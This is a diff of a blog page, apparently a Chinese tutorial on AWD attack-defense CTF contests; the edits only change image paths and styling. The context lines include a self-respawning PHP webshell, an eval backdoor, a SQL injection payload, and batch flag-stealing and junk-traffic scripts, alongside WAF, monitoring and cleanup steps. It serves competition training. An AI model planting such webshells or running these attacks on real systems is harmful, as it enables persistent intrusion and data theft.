@@ -198,7 +198,7 @@
             
             <span class="tag">
                 
-                <a href="/tags/ctf/" style="color: #03a9f4">
+                <a href="/tags/ctf/" style="color: #ffa2c4">
                     ctf
                 </a>
             </span>
@@ -229,8 +229,8 @@ python2  check.py
 cd ~/Downloads/awd-platform
 sudo python2 stop_clean.py
 </code></pre>
-<p><img src="/AWD%E5%AD%A6%E4%B9%A0.assets/image-20240626214647670-1736744819753-1.png" alt="image-20240626214647670"></p>
-<p><img src="/AWD%E5%AD%A6%E4%B9%A0.assets/image-20240626210249067.png" alt="image-20240626210249067"></p>
+<p><img src="/AWD.assets/image-20240626214647670-1736744819753-1.png" alt="image-20240626214647670"></p>
+<p><img src="/AWD.assets/image-20240626210249067.png" alt="image-20240626210249067"></p>
 <p>不同的比赛，规则可能会有区别，但是模式都是一样的，先来看看这个开源项目的规则：</p>
 <ol>
 <li><p>每个队伍分配到一个docker主机，给定ctf用户权限，通过制定的端口和密码进行连接；</p>
@@ -272,7 +272,7 @@ team3:ctf:806a9f6218ec788411c85d1e3b3f6da5 ssh端口：2203 web端口：8803
 </code></pre>
 <p>​	由于主办方设置的默认密码可能存在弱口令问题，因此在获取SSH之后</p>
 <p>​	可以马上利用XShell之类的工具连接我方队伍服务，进行密码修改</p>
-<p><img src="/AWD%E5%AD%A6%E4%B9%A0.assets/image-20240626215627934.png" alt="image-20240626215627934"></p>
+<p><img src="/AWD.assets/image-20240626215627934.png" alt="image-20240626215627934"></p>
 <h3 id="2-2-备份"><a href="#2-2-备份" class="headerlink" title="2.2 备份"></a>2.2 备份</h3><p>比赛开始后，应该马上对服务器资源进行备份</p>
 <p>否则不管是己方人员误操作还是其他队伍人员攻击导致我方服务check失败，而一直丢分</p>
 <p>如果出现服务异常导致check失败，而且无法恢复，只能扣除一定的分值重置服务恢复比赛</p>
@@ -280,7 +280,7 @@ team3:ctf:806a9f6218ec788411c85d1e3b3f6da5 ssh端口：2203 web端口：8803
 <p><img src="https://github.com/eemotionn/static/blob/main/AWD%E5%AD%A6%E4%B9%A0.assets/image-20240626215732283.png" alt="image-20240626215732283"></p>
 <p>将源码导出到本机，完成备份的同时也可以对源码进行代码审计</p>
 <p>如：根据源码中的config.php，掌握数据库连接信息</p>
-<p><img src="/AWD%E5%AD%A6%E4%B9%A0.assets/image-20240626215747984.png" alt="image-20240626215747984"></p>
+<p><img src="/AWD.assets/image-20240626215747984.png" alt="image-20240626215747984"></p>
 <p>此时就可以修改数据库密码以及进行数据库备份。</p>
 <h4 id="修改web管理员密码"><a href="#修改web管理员密码" class="headerlink" title="修改web管理员密码"></a>修改web管理员密码</h4><pre><code class="shell">#以用户root，密码root进入数据库
 mysql -uroot -proot
@@ -291,7 +291,7 @@ use test;
 #显示所有表
 show tables;
 </code></pre>
-<p><img src="/AWD%E5%AD%A6%E4%B9%A0.assets/image-20240626215818619.png" alt="image-20240626215818619"></p>
+<p><img src="/AWD.assets/image-20240626215818619.png" alt="image-20240626215818619"></p>
 <p>根据当前数据库中的表，显然admin表即为Web服务后台管理员用户表，因此修改管理员密码：</p>
 <pre><code class="shell">#查看admin表
 select * from admin;
@@ -299,7 +299,7 @@ select * from admin;
 #修改密码（将admin表中user_name为admin的数据将其user_pass修改为123）
 update admin set user_pass= &#39;123&#39; WHERE user_name = &#39;admin&#39;;
 </code></pre>
-<p><img src="/AWD%E5%AD%A6%E4%B9%A0.assets/image-20240627140716022.png" alt="image-20240627140716022"></p>
+<p><img src="/AWD.assets/image-20240627140716022.png" alt="image-20240627140716022"></p>
 <pre><code>注意：需要根据规则决定是否修改！比如主办方检测后台正常与否会利用用户登录。如果修改了该用户的密码就会导致登录失败，从而不断被checkdown扣分！！！
 </code></pre>
 <h4 id="修改数据库密码"><a href="#修改数据库密码" class="headerlink" title="修改数据库密码"></a>修改数据库密码</h4><pre><code class="shell"># 修改密码
@@ -315,7 +315,7 @@ mysql -uroot -proot123
 
 #注意修改密码后，需要让服务
 </code></pre>
-<p><img src="/AWD%E5%AD%A6%E4%B9%A0.assets/image-20240627140800719.png" alt="image-20240627140800719"></p>
+<p><img src="/AWD.assets/image-20240627140800719.png" alt="image-20240627140800719"></p>
 <h4 id="数据库备份"><a href="#数据库备份" class="headerlink" title="数据库备份"></a>数据库备份</h4><pre><code class="shell">#备份数据库
 mysqldump -uroot -proot123 --all-databases &gt; /tmp/db.sql
 
@@ -325,7 +325,7 @@ mysql -uroot -proot123 &lt; /tmp/db.sql
 <h3 id="2-3-探测ip与端口"><a href="#2-3-探测ip与端口" class="headerlink" title="2.3 探测ip与端口"></a>2.3 探测ip与端口</h3><p>在比赛中，主办方往往只会提供一个SSH服务，不会告诉参赛者其他队伍的出口IP或者端口，所以需要利用端口扫描工具对当前C段进行探测，以便拿到其他队伍的地址，从而进行攻击。使用nmap或者其他端口探测工具进行C段探测：</p>
 <pre><code class="shell">nmap 192.168.197.0/24 -p 1-65535 
 </code></pre>
-<p><img src="/AWD%E5%AD%A6%E4%B9%A0.assets/image-20240627141404256.png" alt="image-20240627141404256"></p>
+<p><img src="/AWD.assets/image-20240627141404256.png" alt="image-20240627141404256"></p>
 <p>由于我方ssh端口为2201，根据扫描结果，得出：</p>
 <pre><code>flag 服务器 ： 192.168.197.129：8080；
 
@@ -338,13 +338,13 @@ mysql -uroot -proot123 &lt; /tmp/db.sql
 队伍三 ： 192.168.197.129：8803；
 </code></pre>
 <h3 id="2-4、flag自动提交脚本"><a href="#2-4、flag自动提交脚本" class="headerlink" title="2.4、flag自动提交脚本"></a>2.4、flag自动提交脚本</h3><p>当前主办方虽然提供了提交flag的web页面：</p>
-<p><img src="/AWD%E5%AD%A6%E4%B9%A0.assets/image-20240627141441353.png" alt="image-20240627141441353"></p>
+<p><img src="/AWD.assets/image-20240627141441353.png" alt="image-20240627141441353"></p>
 <p>但是flag每两分钟刷新一次，同时其他队伍随时可能修复获取flag的漏洞，所以拿到flag后一个个提交效率太低。而且在对抗比赛的时候，因为每个队伍环境都是一致的，在利用某种手段拿下了某个队伍的flag，相同的方式也能拿到其他队伍的flag。所以假设在掌握了某个漏洞后，不管是拿更多其他队伍的Flag，还是拿下Flag后提交，准备脚本自动提交非常有必要。</p>
 <p>假设挖掘到RCE漏洞能够读取flag：</p>
-<p><img src="/AWD%E5%AD%A6%E4%B9%A0.assets/image-20240627141455376.png" alt="image-20240627141455376"></p>
-<p><img src="/AWD%E5%AD%A6%E4%B9%A0.assets/image-20240627141502944.png" alt="image-20240627141502944"></p>
+<p><img src="/AWD.assets/image-20240627141455376.png" alt="image-20240627141455376"></p>
+<p><img src="/AWD.assets/image-20240627141502944.png" alt="image-20240627141502944"></p>
 <p>点击执行，观察数据包为post提交：”shell: cat ..&#x2F;flag”数据从而获取flag。</p>
-<p><img src="/AWD%E5%AD%A6%E4%B9%A0.assets/image-20240627141517242.png" alt="image-20240627141517242"></p>
+<p><img src="/AWD.assets/image-20240627141517242.png" alt="image-20240627141517242"></p>
 <p>编写批量脚本</p>
 <pre><code class="python">#coding=utf-8
 import requests
@@ -372,7 +372,7 @@ for i in range(8802,8804):
 <p>因此也可以利用这个漏洞攻击其他队伍来得分</p>
 <p>这种对抗本质上就是速度和思路上的比拼</p>
 <p>我方先于其他队伍挖掘出漏洞，除了修复己方该漏洞之外，同时也可以利用漏洞攻击其他队伍得分</p>
-<p>其实主要的技术在前期的课程中都已经过学习，而且参与比赛的人员都知道就是这些手段</p>
+<p>其实主要的技术在前期的课程中都已经过，而且参与比赛的人员都知道就是这些手段</p>
 <p>所以接下来主要和大家分享一些需要注意的问题与技巧</p>
 <h3 id="3-1、shell不复用"><a href="#3-1、shell不复用" class="headerlink" title="3.1、shell不复用"></a>3.1、shell不复用</h3><p>在比赛中，权限的维持大部分依靠webshell。往往会出现这样的情况</p>
 <pre><code>A队伍批量攻击所有参赛者时，未进行Shell名称或密码或内容加以隐藏，导致其他队伍的WebShell地址、密码完全一致。
@@ -414,7 +414,7 @@ python3 php_venom_3.3.py t2.php
 #运行过程可能缺少chardet模块，使用pip安装：
 pip3 install chardet -i https://mirrors.aliyun.com/pypi/simple/
 </code></pre>
-<p><img src="/AWD%E5%AD%A6%E4%B9%A0.assets/image-20240627144401535.png" alt="image-20240627144401535"></p>
+<p><img src="/AWD.assets/image-20240627144401535.png" alt="image-20240627144401535"></p>
 <h3 id="3-2、不死马（内存马）"><a href="#3-2、不死马（内存马）" class="headerlink" title="3.2、不死马（内存马）"></a>3.2、不死马（内存马）</h3><p>已方的WebShell可能随时被其他队伍进行查杀。所谓的不死马就能为了加大WebShell的查杀难度。常见的不死马如下：<strong>shell.html.php</strong></p>
 <pre><code class="php">&lt;?php
 //让脚本以进程运行
@@ -436,21 +436,21 @@ while(true)&#123;
 ?&gt;
 </code></pre>
 <p>假设成功获得本次靶场其他队伍后台账户，进行登录：</p>
-<p><img src="/AWD%E5%AD%A6%E4%B9%A0.assets/image-20240627144448884.png" alt="image-20240627144448884"></p>
+<p><img src="/AWD.assets/image-20240627144448884.png" alt="image-20240627144448884"></p>
 <p>**登录成功后滑动到最底部出现文件上传功能：</p>
-<p><img src="/AWD%E5%AD%A6%E4%B9%A0.assets/image-20240627144503220.png" alt="image-20240627144503220"></p>
+<p><img src="/AWD.assets/image-20240627144503220.png" alt="image-20240627144503220"></p>
 <p><strong>将生成不死马脚本上传：</strong></p>
-<p><img src="/AWD%E5%AD%A6%E4%B9%A0.assets/image-20240627144522053.png" alt="image-20240627144522053"></p>
+<p><img src="/AWD.assets/image-20240627144522053.png" alt="image-20240627144522053"></p>
 <p>访问上传后的不死马脚本文件：</p>
-<p><img src="/AWD%E5%AD%A6%E4%B9%A0.assets/image-20240627144540057.png" alt="image-20240627144540057"></p>
+<p><img src="/AWD.assets/image-20240627144540057.png" alt="image-20240627144540057"></p>
 <p><strong>观察文件夹内容：</strong></p>
-<p><img src="/AWD%E5%AD%A6%E4%B9%A0.assets/image-20240627144552079.png" alt="image-20240627144552079"></p>
+<p><img src="/AWD.assets/image-20240627144552079.png" alt="image-20240627144552079"></p>
 <p><strong>此时 .shell.php不死马其实并不是无法删除，而是删除后马上又会创建。在不死马被清除前，可以持续利用其完成控制。</strong></p>
 <pre><code class="shell">http://192.168.79.155:8802/admin/upload/.shell.php
 #post data
 dd28e50635038e9cf3a648c2dd17ad0a=phpinfo();
 </code></pre>
-<p><img src="/AWD%E5%AD%A6%E4%B9%A0.assets/image-20240627144634965.png" alt="image-20240627144634965"></p>
+<p><img src="/AWD.assets/image-20240627144634965.png" alt="image-20240627144634965"></p>
 <h3 id="3-3、混淆干扰"><a href="#3-3、混淆干扰" class="headerlink" title="3.3、混淆干扰"></a>3.3、混淆干扰</h3><p>在比赛时，为了混淆视听，加大对手的分析难度，参赛者可以提前准备一些混淆流量脚本，最简单的方式就是通过自动化攻击过程中随机发送payload。</p>
 <p>其实就是向其他队伍的服务发送垃圾数据包，其他队伍的人不管是人工还是借助一些自动的脚本进行日志分析的时候，这些垃圾数据包就会干扰他们。</p>
 <pre><code>注意：发送垃圾数据包，也需掌握好度。不要跑几十上百个线程冲击其他队伍服务，因为这会导致行成DDOS攻击，DDOS攻击在规则中一般是不允许的。
@@ -509,7 +509,7 @@ for thread in teams:
 <p>因为时间有限，可能并不能够完全准备完成，而且没有固定的先做什么再做什么</p>
 <h3 id="4-1、短文件"><a href="#4-1、短文件" class="headerlink" title="4.1、短文件"></a>4.1、短文件</h3><p>因为AWD比赛往往参赛人员水平参差不齐，所以为了照顾大部分参赛群体，出题人往往会设置一些简单的漏洞</p>
 <p>比如靶场中Web源码根目录下的a.php</p>
-<p><img src="/AWD%E5%AD%A6%E4%B9%A0.assets/image-20240627145027645.png" alt="image-20240627145027645"></p>
+<p><img src="/AWD.assets/image-20240627145027645.png" alt="image-20240627145027645"></p>
 <p>其内容为：</p>
 <pre><code>&lt;?php @eval($_REQUEST[&#39;c&#39;]);
 var_dump($_SERVER);
@@ -518,11 +518,11 @@ var_dump($_SERVER);
 <p>因此可以利用一个简单的命令快速找到这种行数最短的文件，从而分析其是否存在漏洞</p>
 <pre><code class="shell">find /web/ -name &#39;*.php&#39; | xargs wc -l |sort -u
 </code></pre>
-<p><img src="/AWD%E5%AD%A6%E4%B9%A0.assets/image-20240627145117750.png" alt="image-20240627145117750"></p>
+<p><img src="/AWD.assets/image-20240627145117750.png" alt="image-20240627145117750"></p>
 <p>同时也可以直接借助D盾等Web查杀工具，将后门进行删除</p>
-<p><img src="/AWD%E5%AD%A6%E4%B9%A0.assets/image-20240627145144191.png" alt="image-20240627145144191"></p>
+<p><img src="/AWD.assets/image-20240627145144191.png" alt="image-20240627145144191"></p>
 <p>选择下载的Web服务源码目录即可</p>
-<p><img src="/AWD%E5%AD%A6%E4%B9%A0.assets/image-20240627145152943.png" alt="image-20240627145152943"></p>
+<p><img src="/AWD.assets/image-20240627145152943.png" alt="image-20240627145152943"></p>
 <h3 id="4-2、Waf部署"><a href="#4-2、Waf部署" class="headerlink" title="4.2、Waf部署"></a>4.2、Waf部署</h3><p>任何比赛，首先需要先了解其的规则，一般是不允许使用的成熟的waf产品</p>
 <p>因此需要提前准备好各种不同特点的waf脚本，在需要时随时快速完成部署</p>
 <p><a target="_blank" rel="noopener" href="https://github.com/leohearts/awd-watchbird">GitHub - leohearts&#x2F;awd-watchbird: A powerful PHP WAF for AWD</a></p>
@@ -537,19 +537,19 @@ find /web/ -type f -name &#39;*.php&#39;|xargs sed -i &#39;1i&lt;?php require_on
 <pre><code>注意：先批量配置waf，再上传waf.php，否则waf.php中也会包含：&lt;?php require_once &quot;waf.php&quot;;?&gt; 
 虽然PHP中自己包含自己也没问题，但是让人不舒服。
 </code></pre>
-<p><img src="/AWD%E5%AD%A6%E4%B9%A0.assets/image-20240627145450738.png" alt="image-20240627145450738"></p>
+<p><img src="/AWD.assets/image-20240627145450738.png" alt="image-20240627145450738"></p>
 <p>效果</p>
-<p><img src="/AWD%E5%AD%A6%E4%B9%A0.assets/image-20240627145557894.png" alt="image-20240627145557894"></p>
+<p><img src="/AWD.assets/image-20240627145557894.png" alt="image-20240627145557894"></p>
 <p>进行SQL注入攻击，输入</p>
 <pre><code class="sql">-1 union select version(),user(),@@version_compile_os
 </code></pre>
 <p>此时该WAF在**&#x2F;tmp&#x2F;waflog**目录下记录日志</p>
-<p><img src="/AWD%E5%AD%A6%E4%B9%A0.assets/image-20240627145639222.png" alt="image-20240627145639222"></p>
+<p><img src="/AWD.assets/image-20240627145639222.png" alt="image-20240627145639222"></p>
 <p>waf.php只是记录请求的数据日志，并未进行拦截</p>
 <p>若需要拦截，也只需在判定为攻击后，加入以下代码</p>
 <pre><code class="php">die(&quot;fuck hack&quot;);
 </code></pre>
-<p><img src="/AWD%E5%AD%A6%E4%B9%A0.assets/image-20240627145702351.png" alt="image-20240627145702351"></p>
+<p><img src="/AWD.assets/image-20240627145702351.png" alt="image-20240627145702351"></p>
 <h3 id="4-3、web流量控制"><a href="#4-3、web流量控制" class="headerlink" title="4.3、web流量控制"></a>4.3、web流量控制</h3><p>waf中其实已经完成了流量数据的记录，可以通过tail指令够实时查看流量数据</p>
 <pre><code>tail -f /tmp/waflog/req.log
 tail -f /tmp/waflog/attact.log
@@ -557,22 +557,22 @@ tail -f /tmp/waflog/attact.log
 <p>另外也有针对web流量抓取、分析的可视化应用</p>
 <p><a target="_blank" rel="noopener" href="https://github.com/wupco/weblogger?tab=readme-ov-file">GitHub - wupco&#x2F;weblogger: 针对ctf线下赛流量抓取(php)、真实环境流量抓取分析的工具</a></p>
 <h4 id="4-3-1、weblogger部署"><a href="#4-3-1、weblogger部署" class="headerlink" title="4.3.1、weblogger部署"></a>4.3.1、weblogger部署</h4><p>1.将资料中的weblogger.zip解压，并上传至Web目录</p>
-<p><img src="/AWD%E5%AD%A6%E4%B9%A0.assets/image-20240627145943472.png" alt="image-20240627145943472"></p>
+<p><img src="/AWD.assets/image-20240627145943472.png" alt="image-20240627145943472"></p>
 <p>2.修改目录权限为777</p>
 <pre><code>cd /web
 chmod -R 777 weblogger/
 </code></pre>
 <p>3.浏览器访问：<a href="http://IP:端口/weblogger/install.php">http://IP:端口/weblogger/install.php</a> </p>
 <p>4.内容默认即可，点击提交查询</p>
-<p><img src="/AWD%E5%AD%A6%E4%B9%A0.assets/image-20240627145959371.png" alt="image-20240627145959371"></p>
+<p><img src="/AWD.assets/image-20240627145959371.png" alt="image-20240627145959371"></p>
 <p>5.配置管理员用户和密码，账号密码是管理页面的账号密码（填复杂点，难爆破的）</p>
-<p><img src="/AWD%E5%AD%A6%E4%B9%A0.assets/image-20240627150011167.png" alt="image-20240627150011167"></p>
+<p><img src="/AWD.assets/image-20240627150011167.png" alt="image-20240627150011167"></p>
 <p>6.提交后出现以下页面，则表示成功</p>
-<p><img src="/AWD%E5%AD%A6%E4%B9%A0.assets/image-20250113223100048.png" alt="image-20250113223100048"></p>
+<p><img src="/AWD.assets/image-20250113223100048.png" alt="image-20250113223100048"></p>
 <p>在浏览器访问managepath管理后台</p>
 <p> <a href="http://IP:端口/3d9f037601e4db251a1e6e3a09ffe995/78213625b5ab9be804875197c0dab397/managelog.php">http://IP:端口/3d9f037601e4db251a1e6e3a09ffe995/78213625b5ab9be804875197c0dab397/managelog.php</a></p>
 <p>输入配置的管理员用户和密码</p>
-<p><img src="/AWD%E5%AD%A6%E4%B9%A0.assets/image-20240627150048060.png" alt="image-20240627150048060"></p>
+<p><img src="/AWD.assets/image-20240627150048060.png" alt="image-20240627150048060"></p>
 <p><strong>提交后可能出现空格页面，再次刷新即可！</strong></p>
 <p>7.与Waf部署一样，在每个页面加入</p>
 <pre><code class="php">&lt;?php require_once &quot;/tmp/ada403aa7b220c87186603a5549db3a0/weblogpro.php&quot;;?&gt;
@@ -589,31 +589,31 @@ find /web/ -path &#39;/web/0539a93843a715daf72dc6b7edfb352d&#39; -prune -o -type
 <li><p>RISK HIGH：列出拿到flag的流量；</p>
 </li>
 <li><p>MOST_PROB_PAYLOAD：按照是exp的可能性排序所有流量；</p>
-<p><img src="/AWD%E5%AD%A6%E4%B9%A0.assets/image-20240627150201497.png" alt="image-20240627150201497"></p>
+<p><img src="/AWD.assets/image-20240627150201497.png" alt="image-20240627150201497"></p>
 </li>
 </ul>
 <p>同时根部署时的第四步配置：<code>cat /flag</code></p>
 <p>一旦有IP请求的数据包携带该方式读取flag，会被替换成虚假数据：</p>
-<p><img src="/AWD%E5%AD%A6%E4%B9%A0.assets/image-20240627150217274.png" alt="image-20240627150217274"></p>
-<p><img src="/AWD%E5%AD%A6%E4%B9%A0.assets/image-20240627150225172.png" alt="image-20240627150225172"></p>
+<p><img src="/AWD.assets/image-20240627150217274.png" alt="image-20240627150217274"></p>
+<p><img src="/AWD.assets/image-20240627150225172.png" alt="image-20240627150225172"></p>
 <p>同时该IP会被拉入黑名单，访问我方Web服务任意请求，Weblogger都会拦截并显示虚假flag</p>
 <pre><code>这种处置，很容易让攻击服务意识到自己获取的是虚假flag
 </code></pre>
-<p><img src="/AWD%E5%AD%A6%E4%B9%A0.assets/image-20240627150248073.png" alt="image-20240627150248073"></p>
+<p><img src="/AWD.assets/image-20240627150248073.png" alt="image-20240627150248073"></p>
 <p>日志也会同时记录</p>
-<p><img src="/AWD%E5%AD%A6%E4%B9%A0.assets/image-20240627150258615.png" alt="image-20240627150258615"></p>
+<p><img src="/AWD.assets/image-20240627150258615.png" alt="image-20240627150258615"></p>
 <h3 id="4-4、文件监控"><a href="#4-4、文件监控" class="headerlink" title="4.4、文件监控"></a>4.4、文件监控</h3><p>文件监控主要是为了解决其他队伍上传WebShell或删除Web原本文件导致服务失效而扣分问题</p>
 <p>在应急响应课程中，我们利用了find命令来查找有修改的文件</p>
 <p>其实也可以利用脚本来实现实时监控，同时还可以在脚本中自动进行处理</p>
 <p>比如删除文件自动恢复，上传WebShell自动查杀等等</p>
 <p>修改资料中的文件监控脚本file_monitor.py：</p>
-<p><img src="/AWD%E5%AD%A6%E4%B9%A0.assets/image-20240627150323938.png" alt="image-20240627150323938"></p>
+<p><img src="/AWD.assets/image-20240627150323938.png" alt="image-20240627150323938"></p>
 <p>修改完成后上传至Web服务并启动：</p>
-<p><img src="/AWD%E5%AD%A6%E4%B9%A0.assets/image-20240627150339211.png" alt="image-20240627150339211"></p>
+<p><img src="/AWD.assets/image-20240627150339211.png" alt="image-20240627150339211"></p>
 <pre><code>python2 file_monitor.py
 </code></pre>
 <p>自动备份+自动恢复被修改文件+删除上传文件：</p>
-<p><img src="/AWD%E5%AD%A6%E4%B9%A0.assets/image-20240627150402025.png" alt="image-20240627150402025"></p>
+<p><img src="/AWD.assets/image-20240627150402025.png" alt="image-20240627150402025"></p>
 <h3 id="4-5、不死马清理"><a href="#4-5、不死马清理" class="headerlink" title="4.5、不死马清理"></a>4.5、不死马清理</h3><p>如果部署了文件监控，或者上传不死马生成脚本被Waf拦截自然不用担心不死马的出现</p>
 <p>本节讨论的是如果已经被植入不死马，如何对不死马进行清理</p>
 <p>要杀死生成不死马进程，只能重启apache服务清理内存</p>
@@ -624,7 +624,7 @@ find /web/ -path &#39;/web/0539a93843a715daf72dc6b7edfb352d&#39; -prune -o -type
 cd /web/admin/upload
 rm -rf .shell.php | mkdir .shell.php
 </code></pre>
-<p><img src="/AWD%E5%AD%A6%E4%B9%A0.assets/image-20240627150437946.png" alt="image-20240627150437946"></p>
+<p><img src="/AWD.assets/image-20240627150437946.png" alt="image-20240627150437946"></p>
 <h3 id="4-6、总结"><a href="#4-6、总结" class="headerlink" title="4.6、总结"></a>4.6、总结</h3><p>攻防一体，蓝队的技术即根据如何攻击，反向完成对应的防守</p>
 <p>本章节主要分享一些技巧与思路，除本节的技术之外</p>
 <p>应急响应篇中的技术都是蓝队部分的内容</p>
